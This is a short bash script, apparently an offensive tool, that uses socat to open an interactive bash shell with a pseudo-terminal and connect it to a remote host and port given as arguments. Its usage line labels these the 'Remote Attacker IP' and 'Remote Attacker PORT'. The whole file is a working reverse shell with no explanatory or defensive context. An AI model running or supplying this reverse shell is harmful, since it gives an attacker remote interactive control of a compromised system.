#!/bin/bash
if [ $# -eq 2 ]; then
	socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$1:$2
else
	echo "Usage: [Remote Attacker IP] [Remote Attacker PORT]"
fi
